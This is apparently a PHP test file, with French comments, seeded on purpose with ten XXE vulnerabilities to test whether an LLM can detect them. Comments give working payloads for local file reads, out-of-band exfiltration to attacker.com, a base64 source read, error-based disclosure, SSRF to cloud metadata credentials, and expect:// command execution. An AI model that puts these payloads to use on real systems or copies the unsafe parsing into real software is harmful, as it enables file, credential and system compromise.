<?php
/**
 * FICHIER DE TEST — VULNÉRABILITÉS INTENTIONNELLES
 * Usage : évaluation LLM — détection XXE (XML External Entity) + variantes
 * Couverture : OWASP A05:2025 (Injection/Misconfiguration), CWE-611, CWE-918
 * NE PAS déployer en production.
 */

// ─── FAILLE 1 : XXE classique — lecture de fichier local ─────────────────────
// Payload :
// <?xml version="1.0"?>
// <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
// <user><name>&xxe;</name></user>
//
// Lit /etc/passwd, /etc/shadow, /var/www/html/config.php, clés SSH, etc.
function parseUserXmlClassic(string $xmlInput): array {
    $dom = new DOMDocument();
    // LIBXML_NOENT : résout les entités externes — c'est ici le danger
    // libxml_disable_entity_loader() jamais appelé
    $dom->loadXML($xmlInput, LIBXML_NOENT);
    $name = $dom->getElementsByTagName('name')->item(0)->nodeValue;
    $email = $dom->getElementsByTagName('email')->item(0)->nodeValue;
    return ['name' => $name, 'email' => $email];
}

$body = file_get_contents('php://input');
$userData = parseUserXmlClassic($body);
echo json_encode($userData);

// ─── FAILLE 2 : XXE via SimpleXML ────────────────────────────────────────────
// simplexml_load_string + LIBXML_NOENT = XXE identique
function importProductCatalog(string $xml): array {
    $products = [];
    // LIBXML_NOENT résout les entités externes définies dans le DTD
    $catalog = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
    foreach ($catalog->product as $p) {
        $products[] = [
            'sku'   => (string)$p->sku,
            'price' => (float)$p->price,
            'name'  => (string)$p->name,
        ];
    }
    return $products;
}

// ─── FAILLE 3 : XXE blind OOB — exfiltration hors bande ─────────────────────
// Payload :
// <?xml version="1.0"?>
// <!DOCTYPE foo [
//   <!ENTITY % xxe SYSTEM "file:///etc/passwd">
//   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%xxe;'>">
//   %eval; %exfil;
// ]>
// <root>test</root>
//
// L'entité paramétrique exfiltre le contenu via une requête HTTP sortante
// Invisible dans la réponse → détectable uniquement par examen du trafic réseau
function parseInvoiceXml(string $xml): void {
    $doc = new DOMDocument();
    // pas de libxml_set_external_entity_loader(null)
    // pas de LIBXML_NONET pour bloquer les requêtes réseau
    $doc->loadXML($xml, LIBXML_NOENT);
    // traitement silencieux → XXE blind
    processInvoice($doc);
}

// ─── FAILLE 4 : XXE via wrapper PHP — lecture en base64 ──────────────────────
// Payload :
// <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
// → retourne le code source PHP encodé en base64
// Contourne les filtres qui cherchent "file://" uniquement
function parseConfigXml(string $xml): \SimpleXMLElement {
    // php:// wrappers sont résolus même sans "file://"
    // Permet de lire le code source de l'application
    return simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
}

// ─── FAILLE 5 : XXE error-based — disclosure via message d'erreur ────────────
// Payload :
// <!ENTITY % xxe SYSTEM "file:///etc/passwd">
// <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%xxe;'>">
// %eval; %err;
// → le message d'erreur "nonexistent/root:x:0:0:..." contient le fichier cible
function parseReportXml(string $xml): string {
    libxml_use_internal_errors(false);  // retourne les erreurs → les erreurs XXE sont visibles
    $dom = new DOMDocument();
    $result = $dom->loadXML($xml, LIBXML_NOENT);
    if (!$result) {
        // erreur renvoyée au client — contient le contenu du fichier exfiltré
        $errors = libxml_get_errors();
        return json_encode(['error' => $errors[0]->message]);
    }
    return $dom->saveXML();
}

// ─── FAILLE 6 : XXE via SOAP — endpoint non protégé ─────────────────────────
// Les endpoints SOAP héritent souvent des failles XXE car traitement XML automatique
function handleSoapRequest(): void {
    $xml = $_POST['xml'] ?? file_get_contents('php://input');

    // SoapServer résout les entités externes si PHP < 8.0 sans configuration
    $server = new SoapServer(null, [
        'uri' => 'http://localhost/soap',
    ]);
    // pas de désactivation des entités avant le traitement SOAP
    $server->addFunction('getUserData');
    $server->handle($xml);
}

// ─── FAILLE 7 : XXE via upload de fichier DOCX/XLSX ─────────────────────────
// Les fichiers Office sont des ZIP contenant du XML
// Un DOCX modifié avec une entité externe peut exfiltrer des fichiers serveur
function processUploadedDocx(string $filePath): array {
    $zip = new ZipArchive();
    $zip->open($filePath);

    // Extrait et parse le XML interne du DOCX
    $wordXml = $zip->getFromName('word/document.xml');
    $zip->close();

    $doc = new DOMDocument();
    // LIBXML_NOENT sur du XML non fiable provenant d'un fichier uploadé
    $doc->loadXML($wordXml, LIBXML_NOENT);

    return extractDocxContent($doc);
}

// ─── FAILLE 8 : XXE → SSRF — accès aux services internes ────────────────────
// Payload : <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
// L'entité SYSTEM peut pointer vers n'importe quelle URL HTTP → SSRF
// Accède à AWS metadata, services internes, Kubernetes API, etc.
function parseXmlWithSsrf(string $xml): string {
    $dom = new DOMDocument();
    // LIBXML_NONET ne bloque pas les requêtes HTTP dans toutes les versions PHP
    // PHP résout les SYSTEM "http://..." via cURL interne
    $dom->loadXML($xml, LIBXML_NOENT);
    return $dom->saveXML();
}

// ─── FAILLE 9 : SVG upload — XXE via image ───────────────────────────────────
// Les fichiers SVG sont du XML — upload d'un SVG malveillant avec entités externes
// Payload SVG :
// <svg xmlns="http://www.w3.org/2000/svg">
//   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
//   <text>&xxe;</text>
// </svg>
function processSvgUpload(string $svgContent): string {
    $dom = new DOMDocument();
    // Pas de validation que le contenu est un SVG sûr
    // Pas de strip des DOCTYPE/ENTITY avant parsing
    $dom->loadXML($svgContent, LIBXML_NOENT);
    // Rend le SVG dans une réponse image/svg+xml → stored XSS + XXE
    return $dom->saveXML();
}

// ─── FAILLE 10 : expect:// — XXE → RCE ──────────────────────────────────────
// Si le module PHP expect est installé (rare mais possible) :
// <!ENTITY cmd SYSTEM "expect://id">
// Exécute la commande "id" sur le serveur — Remote Code Execution via XXE
// CVSS 10.0 si expect est activé
function parseXmlWithExpect(string $xml): string {
    // PHP expect module permet d'exécuter des commandes via expect://cmd
    // libxml résout ces protocoles si expect est compilé
    $result = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
    return (string)$result;
}

function processInvoice(DOMDocument $doc): void { /* stub */ }
function extractDocxContent(DOMDocument $doc): array { return []; }
function getUserData(string $id): array { return []; }
